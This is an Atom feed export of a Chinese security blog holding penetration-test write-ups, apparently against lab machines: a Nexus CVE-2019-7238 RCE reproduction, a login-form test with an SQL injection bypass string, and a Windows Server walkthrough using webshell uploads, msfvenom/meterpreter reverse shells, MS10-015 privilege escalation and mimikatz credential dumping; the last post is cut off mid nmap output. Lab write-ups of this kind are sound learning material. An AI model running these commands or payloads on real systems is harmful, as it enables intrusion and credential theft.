<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>梦梦安全</title>
  
  <subtitle>只要没完蛋，就还可以继续。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.lanbainan.cn/"/>
  <updated>2019-11-04T05:43:33.387Z</updated>
  <id>http://www.lanbainan.cn/</id>
  
  <author>
    <name>EV</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>记录一下Nexus存储库管理器远程代码执行</title>
    <link href="http://www.lanbainan.cn/2019/11/04/2019-11-04/"/>
    <id>http://www.lanbainan.cn/2019/11/04/2019-11-04/</id>
    <published>2019-11-04T05:42:00.000Z</published>
    <updated>2019-11-04T05:43:33.387Z</updated>
    
    <content type="html"><![CDATA[<h1 id="偶然碰上Nexus擦出火花"><a href="#偶然碰上Nexus擦出火花" class="headerlink" title="偶然碰上Nexus擦出火花"></a>偶然碰上Nexus擦出火花</h1><p>又是摸鱼时刻<br>翻出以前的站<br>查查有没有更新<br><a id="more"></a></p><h2 id="有趣的开始"><a href="#有趣的开始" class="headerlink" title="有趣的开始"></a>有趣的开始</h2><p><img src="https://i.loli.net/2019/11/04/QAuiH6Wy8Z4gzDU.png" alt="1.png"><br>反正我是很懵逼的，毕竟没见过啊<br><img src="https://i.loli.net/2019/11/04/ulPmSUdONF95xoj.png" alt="2.png"><br>但是它非常贴心的告诉我，这个版本有<a href="https://support.sonatype.com/hc/en-us/articles/360017310793-CVE-2019-7238-Nexus-Repository-Manager-3-Missing-Access-Controls-and-Remote-Code-Execution-February-5th-2019" target="_blank" rel="noopener">问题</a><br><img src="https://i.loli.net/2019/11/04/OV8CPGfYyeAFocn.png" alt="3.png"><br>我都不好意思了，翻翻GitHub发现<a href="https://github.com/jas502n/CVE-2019-7238" target="_blank" rel="noopener">RCE</a><br><img src="https://i.loli.net/2019/11/04/vgfCnFEaHbNWzR2.png" alt="4.png"><br>直接拿下，<br><img src="https://i.loli.net/2019/11/04/eoGgPDnVfdCNk5a.png" alt="5.png"><br>注意存储库需要有东西<br>默认密码admin:admin123</p><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;偶然碰上Nexus擦出火花&quot;&gt;&lt;a href=&quot;#偶然碰上Nexus擦出火花&quot; class=&quot;headerlink&quot; title=&quot;偶然碰上Nexus擦出火花&quot;&gt;&lt;/a&gt;偶然碰上Nexus擦出火花&lt;/h1&gt;&lt;p&gt;又是摸鱼时刻&lt;br&gt;翻出以前的站&lt;br&gt;查查有没有更新&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="复现" scheme="http://www.lanbainan.cn/tags/%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>对登录框的测试</title>
    <link href="http://www.lanbainan.cn/2019/10/10/2019-10-10/"/>
    <id>http://www.lanbainan.cn/2019/10/10/2019-10-10/</id>
    <published>2019-10-10T06:00:11.000Z</published>
    <updated>2019-10-10T06:15:26.578Z</updated>
    
    <content type="html"><![CDATA[<h1 id="万恶的登录框"><a href="#万恶的登录框" class="headerlink" title="万恶的登录框"></a>万恶的登录框</h1><p>老大哥时不时给你一个登录框问你有没有问题<br>我也很绝望，对与这些业务系统又不敢扫<br>懵逼树下懵逼果懵逼的我o(╥﹏╥)o<br>感谢@klion提供环境<br><a id="more"></a></p><h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><p><img src="https://i.loli.net/2019/10/10/GX6rVhjsuDypF1Z.png" alt="1.png"><br>抓包分析,本意是想枚举试试<br>结果发现cookie中带有惊喜<br><img src="https://i.loli.net/2019/10/10/6Ow5Yu3VB4IKRsg.png" alt="2.png"><br>解密得到<code>admin:123456</code><br><img src="https://i.loli.net/2019/10/10/Ls6DtR4y3a7kHo1.png" alt="3.png"></p><h1 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h1><p><img src="https://i.loli.net/2019/10/10/lcvFgJCtxzyesHZ.png" alt="4.png"><br>万能密码成功<br><code>admin&#39; or &#39;a&#39;=&#39;a</code><br><img src="https://i.loli.net/2019/10/10/7pdynRkr1aQSUVb.png" alt="5.png"><br>管理员权限</p><h1 id="待更新"><a href="#待更新" class="headerlink" title="待更新"></a>待更新</h1><hr><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;万恶的登录框&quot;&gt;&lt;a href=&quot;#万恶的登录框&quot; class=&quot;headerlink&quot; title=&quot;万恶的登录框&quot;&gt;&lt;/a&gt;万恶的登录框&lt;/h1&gt;&lt;p&gt;老大哥时不时给你一个登录框问你有没有问题&lt;br&gt;我也很绝望，对与这些业务系统又不敢扫&lt;br&gt;懵逼树下懵逼果懵逼的我o(╥﹏╥)o&lt;br&gt;感谢@klion提供环境&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="登录框" scheme="http://www.lanbainan.cn/tags/%E7%99%BB%E5%BD%95%E6%A1%86/"/>
    
  </entry>
  
  <entry>
    <title>记一次对Win2008(x64) 数据中心版的测试</title>
    <link href="http://www.lanbainan.cn/2019/09/22/2019-09-22/"/>
    <id>http://www.lanbainan.cn/2019/09/22/2019-09-22/</id>
    <published>2019-09-22T08:16:00.000Z</published>
    <updated>2019-10-09T01:37:03.609Z</updated>
    
    <content type="html"><![CDATA[<h1 id="开搞"><a href="#开搞" class="headerlink" title="开搞"></a>开搞</h1><p>环境：IIS 7.0 + MSSQL 2008 + 赛门铁克3.3 Apache/2.2.15 + Mysql 5.5.27 + php-5.3.15<br>本机：kali 2019<br>感谢@klion提供环境<br>将继续学习Windows下的安全测试<br><a id="more"></a></p><h2 id="测试一下"><a href="#测试一下" class="headerlink" title="测试一下"></a>测试一下</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sC -sV 192.168.3.13</span><br><span class="line">PORT      STATE SERVICE            VERSION</span><br><span class="line">23/tcp    open  telnet?</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   GetRequest, TerminalServerCookie, oracle-tns:</span><br><span class="line">|_    telnet</span><br><span class="line">80/tcp    open  http               Apache httpd 2.2.15 ((Win32) PHP/5.3.15)</span><br><span class="line">|_http-server-header: Apache/2.2.15 (Win32) PHP/5.3.15</span><br><span class="line">|_http-title: phpinfo()</span><br><span class="line">82/tcp    open  http               Microsoft IIS httpd 7.0</span><br><span class="line">| http-cookie-flags:</span><br><span class="line">|   /:</span><br><span class="line">|     ASPSESSIONIDQCSTBQCD:</span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/7.0</span><br><span class="line">|_http-title: \xC6\xFB\xB3\xB5\xC5\xE4\xBC\xFE\xC6\xF3\xD2\xB5\xCD\xF8\xD5\xBE\xB9\xDC\xC0\xED\xCF\xB5\xCD\xB3v1.0--\xCA\xD7\xD2\xB3</span><br></pre></td></tr></table></figure><p><details><br>  <summary>点击查看更多</summary><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">84/tcp    open  http               Microsoft IIS httpd 7.0</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/7.0</span><br><span class="line">|_http-title: \xE5\x8C\x97\xE4\xBA\xAC\xE4\xB8\x8A\xE4\xBA\x91CMS\xE7\xB3\xBB\xE7\xBB\x9F</span><br><span class="line">85/tcp    open  http               Microsoft IIS httpd 7.0</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/7.0</span><br><span class="line">|_http-title: \xE6\xAC\xA2\xE8\xBF\x8E\xE4\xBD\xBF\xE7\x94\xA8\xE9\x94\x90\xE5\x95\x86\xE4\xBC\x81\xE4\xB8\x9ACMS - \xE5\x9F\xBA\xE4\xBA\x8E COMSHARP CMS</span><br><span class="line">135/tcp   open  msrpc              Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds       Windows Server (R) 2008 Datacenter 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">1433/tcp  open  ms-sql-s           Microsoft SQL Server 2008 10.00.1600.00; RTM</span><br><span class="line">| ms-sql-ntlm-info:</span><br><span class="line">|   Target_Name: IIS70-CN</span><br><span class="line">|   NetBIOS_Domain_Name: IIS70-CN</span><br><span class="line">|   NetBIOS_Computer_Name: IIS70-CN</span><br><span class="line">|   DNS_Domain_Name: IIS70-CN</span><br><span class="line">|   DNS_Computer_Name: IIS70-CN</span><br><span class="line">|_  Product_Version: 6.0.6001</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2019-09-21T08:07:44</span><br><span class="line">|_Not valid after:  2049-09-21T08:07:44</span><br><span class="line">|_ssl-date: 2019-09-22T02:21:58+00:00; -1s from scanner time.</span><br><span class="line">2383/tcp  open  ms-olap4?</span><br><span class="line">3306/tcp  open  mysql              MySQL 5.5.27</span><br><span class="line">| mysql-info:</span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.5.27</span><br><span class="line">|   Thread ID: 5</span><br><span class="line">|   Capabilities flags: 63487</span><br><span class="line">|   Some Capabilities: ConnectWithDatabase, Support41Auth, Speaks41ProtocolOld, FoundRows, SupportsCompression, Speaks41ProtocolNew, SupportsTransactions, ODBCClient, IgnoreSigpipes, InteractiveClient, LongColumnFlag, LongPassword, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: &#123;=Z1$_4#SW;aUh-BH~gg&#125;</span><br><span class="line">|_  Auth Plugin Name: mysql_native_password</span><br><span class="line">3389/tcp  open  ssl/ms-wbt-server?</span><br><span class="line">|_ssl-date: 2019-09-22T02:21:58+00:00; -1s from scanner time.</span><br><span class="line">49152/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49156/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49157/tcp open  msrpc              Microsoft Windows RPC</span><br></pre></td></tr></table></figure></details></p><p></p><h3 id="23端口"><a href="#23端口" class="headerlink" title="23端口"></a>23端口</h3><p>暂无信息</p><h3 id="80端口-Joomla-2-5-20"><a href="#80端口-Joomla-2-5-20" class="headerlink" title="80端口 Joomla 2.5.20"></a>80端口 Joomla 2.5.20</h3><p><img src="https://i.loli.net/2019/09/25/xSkrh4D1lAmWqLc.png" alt="15.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# whatweb -a 3 -v http://192.168.3.13/Joomla_2.5.20/</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/09/25/IiGlKpWaVtumLsk.png" alt="16.png"><br><code>whatweb</code>对国外cms支持还是比较好的，国内云悉好一点<br><code>administrator/index.php</code>后台登录界面，<code>admin:admin</code><br><img src="https://i.loli.net/2019/09/26/RTg8apsE2Sey4lq.png" alt="17.png"><br>发现修改添加插件处<br><img src="https://i.loli.net/2019/09/29/2wPWiapMCD7nmjE.png" alt="18.png"><br>传一个马（一直提示上传失败，实际上是成功了的）<br><img src="https://i.loli.net/2019/09/29/PVTNzx1qdmy87AZ.png" alt="19.png"><br>传冰蝎马，蚁剑报错，应该是杀软啥的不让我连接。<br><img src="https://i.loli.net/2019/09/29/VxOW3iMHqnjFpJt.png" alt="20.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set PAYLOAD php/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set LHOST 192.168.3.128</span><br><span class="line">LHOST =&gt; 192.168.3.128</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: SYSTEM (0)</span><br></pre></td></tr></table></figure></p><p>注：php和Windows模块中的命令差距挺大的</p><h3 id="82端口-企成网站管理系统2-0"><a href="#82端口-企成网站管理系统2-0" class="headerlink" title="82端口 企成网站管理系统2.0"></a>82端口 企成网站管理系统2.0</h3><p>看看首页是啥样<br><img src="https://i.loli.net/2019/09/22/UazSB9dJ1TXj6DH.png" alt="1.png"><br>第一次碰见把密码放外面的<br><img src="https://i.loli.net/2019/09/22/SOxPom3vayF2NHz.png" alt="2.png"><br>轻轻一扫出后台<br><img src="https://i.loli.net/2019/09/22/SaZwguR9AQH6G24.png" alt="3.png"><br>登录进去，啥也没有<br>再扫，发现<code>ewebeditor</code>编辑器<br><img src="https://i.loli.net/2019/09/24/D5joc6L8s7v3OAq.png" alt="4.png"><br>根据百度，下载了<code>db/ewebeditor.mdb</code>数据库<br><img src="https://i.loli.net/2019/09/24/vzRMf8JULDslrPB.png" alt="5.png"><br>得到<code>admin:swit999</code>,版本2.8<br>上传马儿，蚁剑连接<br><img src="https://i.loli.net/2019/09/24/4gsHvNmGYTBu9KM.png" alt="6.png"><br>上传后门，msf连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.3.10 lport=4444 -f exe -o test.exe</span><br><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set LHOST 192.168.3.10</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: NT AUTHORITY\NETWORK SERVICE</span><br></pre></td></tr></table></figure></p><p>事实上<code>getsystem</code>已经满足不了需求了<br>在低权限下<code>Windows-Exploit-suggester</code>很有帮助<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; use post/multi/recon/local_exploit_suggester</span><br><span class="line">msf5 post(multi/recon/local_exploit_suggester) &gt; set session 1 </span><br><span class="line">msf5 post(multi/recon/local_exploit_suggester) &gt; exploit</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/09/24/Imxh6zoE5ODAeyc.png" alt="7.png"><br>已经帮我们测试出可利用exp<br>将<code>systeminfo</code>信息扔到<a href="https://bugs.hacking8.com/tiquan/" target="_blank" rel="noopener">提权辅助网页</a>发现有<code>MS17-010</code>，一打就蓝屏<br>使用<code>MS10-015</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf5 post(multi/recon/local_exploit_suggester) &gt; use exploit/windows/local/ms10_015_kitrap0d</span><br><span class="line">msf5 exploit(windows/local/ms10_015_kitrap0d) &gt; set LHOST 192.168.3.10</span><br><span class="line">msf5 exploit(windows/local/ms10_015_kitrap0d) &gt; set LPORT 4445</span><br><span class="line">msf5 exploit(windows/local/ms10_015_kitrap0d) &gt; set session 2</span><br><span class="line">msf5 exploit(windows/local/ms10_015_kitrap0d) &gt; exploit</span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure></p><p>读个密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; kerberos</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/09/24/oYlNjU5EasftciR.png" alt="8.png"><br>登录一下<br><img src="https://i.loli.net/2019/09/24/Kz9UDL54YJTR6cq.png" alt="9.png"></p><h3 id="84端口-sycms"><a href="#84端口-sycms" class="headerlink" title="84端口 sycms"></a>84端口 sycms</h3><p><img src="https://i.loli.net/2019/09/24/fsGZvrNmqFPOWtS.png" alt="10.png"><br>一扫死，应该有waf啥的<br>猜一下后台<code>/admin</code> 猜一下密码<code>admin:admin888</code><br><img src="https://i.loli.net/2019/09/25/NgLQ52mW8qFGVhX.png" alt="11.png"><br>看见一个编辑器，猜一下编辑器，得到一个<code>CKFinder</code>编辑器，哦豁传不上去马儿<br>发现可以备份/还原文件，将马儿夹在文件里，进行备份还原<br><img src="https://i.loli.net/2019/09/25/RrknBaWDGfIC5Vo.png" alt="12.png"><br>蚁剑凉了，连接不上，很有可能被拦截了<br>上冰蝎，连接成功<br><img src="https://i.loli.net/2019/09/25/F6lkJfsVwQ54iov.png" alt="13.png"><br>使用蝎子反弹<code>meterpreter shell</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\NETWORK SERVICE</span><br></pre></td></tr></table></figure></p><p>然后套路一样了</p><h3 id="85端口-锐商企业CMS"><a href="#85端口-锐商企业CMS" class="headerlink" title="85端口 锐商企业CMS"></a>85端口 锐商企业CMS</h3><p><img src="https://i.loli.net/2019/09/25/BJ5t9v1HqsODVQe.png" alt="14.png"><br>老套路<code>admin:admin</code>登录后台<br><img src="https://i.loli.net/2019/09/29/MK5q6paF1XgESHA.png" alt="21.png"><br>但是当前文件没有执行权限，尝试转移webshell<br><img src="https://i.loli.net/2019/10/09/TyafvsJGHqgREkS.png" alt="22.png"><br>修改为<code>/</code>,发现文件上传到根目录<br>蝎子连接，转msf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\NETWORK SERVICE</span><br></pre></td></tr></table></figure></p><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;开搞&quot;&gt;&lt;a href=&quot;#开搞&quot; class=&quot;headerlink&quot; title=&quot;开搞&quot;&gt;&lt;/a&gt;开搞&lt;/h1&gt;&lt;p&gt;环境：IIS 7.0 + MSSQL 2008 + 赛门铁克3.3 Apache/2.2.15 + Mysql 5.5.27 + php-5.3.15&lt;br&gt;本机：kali 2019&lt;br&gt;感谢@klion提供环境&lt;br&gt;将继续学习Windows下的安全测试&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="Windows" scheme="http://www.lanbainan.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>记一次对2003 企业版的测试</title>
    <link href="http://www.lanbainan.cn/2019/09/17/2019-09-17/"/>
    <id>http://www.lanbainan.cn/2019/09/17/2019-09-17/</id>
    <published>2019-09-17T04:54:00.000Z</published>
    <updated>2019-09-21T07:59:03.765Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>靶机：IIS 6.X + MSSQL 2008 + php 5.2.17 [ 以iis服务权限运行 ] + mysql 5.1.x<br>本机：kali 2019<br>感谢@klion提供环境<br>深刻感受到靶机与实战的区别<br><a id="more"></a></p><h1 id="开搞"><a href="#开搞" class="headerlink" title="开搞"></a>开搞</h1><h2 id="测试一下"><a href="#测试一下" class="headerlink" title="测试一下"></a>测试一下</h2><p>nmap 测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -A -v 192.168.3.5</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">23/tcp   open  telnet?</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 6.0</span><br><span class="line">| http-methods:</span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST</span><br><span class="line">|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT</span><br><span class="line">|_http-server-header: Microsoft-IIS/6.0</span><br><span class="line">|_http-title: \xBD\xA8\xC9\xE8\xD6\xD0</span><br><span class="line">| http-webdav-scan:</span><br><span class="line">|   WebDAV type: Unknown</span><br><span class="line">|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK</span><br><span class="line">|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH</span><br><span class="line">|   Server Type: Microsoft-IIS/6.0</span><br><span class="line">|_  Server Date: Tue, 17 Sep 2019 06:36:59 GMT</span><br></pre></td></tr></table></figure></p><p><details><br>  <summary>点击查看更多</summary><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">81/tcp   open  http          Microsoft IIS httpd 6.0</span><br><span class="line">| http-cookie-flags:</span><br><span class="line">|   /:</span><br><span class="line">|     ASPSESSIONIDCCSBTCQS:</span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-methods:</span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH</span><br><span class="line">|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH</span><br><span class="line">|_http-server-header: Microsoft-IIS/6.0</span><br><span class="line">|_http-title: Fyblogs\xD0\xC2\xCE\xC5\xCE\xC4\xD5\xC2\xCF\xB5\xCD\xB3</span><br><span class="line">| http-webdav-scan:</span><br><span class="line">|   WebDAV type: Unknown</span><br><span class="line">|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK</span><br><span class="line">|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH</span><br><span class="line">|   Server Type: Microsoft-IIS/6.0</span><br><span class="line">|_  Server Date: Tue, 17 Sep 2019 06:37:00 GMT</span><br><span class="line">82/tcp   open  http          Microsoft IIS httpd 6.0</span><br><span class="line">|_http-favicon: Unknown favicon MD5: C8F6FEA978F73DF79ECF0134FA2129DB</span><br><span class="line">| http-methods:</span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH</span><br><span class="line">|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH</span><br><span class="line">| http-ntlm-info:</span><br><span class="line">|   Target_Name: IIS6CN</span><br><span class="line">|   NetBIOS_Domain_Name: IIS6CN</span><br><span class="line">|   NetBIOS_Computer_Name: IIS6CN</span><br><span class="line">|   